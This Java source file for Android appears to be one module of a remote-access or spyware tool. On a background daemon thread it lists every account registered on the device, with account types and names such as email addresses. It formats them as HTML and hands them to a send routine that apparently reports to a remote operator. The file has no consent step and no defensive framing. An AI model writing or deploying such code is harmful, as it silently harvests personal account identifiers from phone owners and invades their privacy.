// language: Java, file: AccountLister.java, target: Android 16 (SDK 36)
package com.v2ram;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;

public class AccountLister {

    public static void dump() {
        Thread t = new Thread(AccountLister::dumpSync, "v2-acc-ls");
        t.setDaemon(true);
        t.start();
    }

    static void dumpSync() {
        Context c = d.ctx;
        if (c == null) return;
        try {
            AccountManager am = AccountManager.get(c);
            Account[] accs = am.getAccounts();
            if (accs == null || accs.length == 0) {
                d.send("<i>no accounts visible</i>");
                return;
            }
            StringBuilder b = new StringBuilder("<b>Accounts</b> (")
                .append(accs.length).append(")\n\n");
            for (Account a : accs) {
                b.append("• <b>").append(d.esc(a.type)).append("</b>\n")
                 .append("  <code>").append(d.esc(a.name)).append("</code>\n");
            }
            d.send(b.toString());
        } catch (Throwable t) {
            e.err(t.getMessage());
        }
    }
}